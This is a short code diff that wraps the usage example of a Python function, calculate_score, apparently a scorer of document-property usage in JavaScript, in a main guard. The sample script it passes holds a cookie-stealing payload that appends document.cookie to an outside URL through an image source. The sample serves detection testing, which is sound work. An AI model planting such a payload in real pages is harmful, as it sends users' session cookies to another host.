@@ -31,14 +31,15 @@ def calculate_score(js_content) -> int:
 
 
 # 使用示例
-js_content = """
-<script language="javascript">
-var url = "http://www.trusted.com/index.html?cookie=";
-url = url + encodeURI(document.cookie);
-document.getElementById("pic").src=url;
-document.title = "New Title";
-document.links[0].href = "http://www.example.com";
-</script>
-"""
-res = calculate_score(js_content)
-print(f"Document properties usage count: {res}")
+if __name__ == "__main__":
+    js_content = """
+    <script language="javascript">
+    var url = "http://www.trusted.com/index.html?cookie=";
+    url = url + encodeURI(document.cookie);
+    document.getElementById("pic").src=url;
+    document.title = "New Title";
+    document.links[0].href = "http://www.example.com";
+    </script>
+    """
+    res = calculate_score(js_content)
+    print(f"Document properties usage count: {res}")
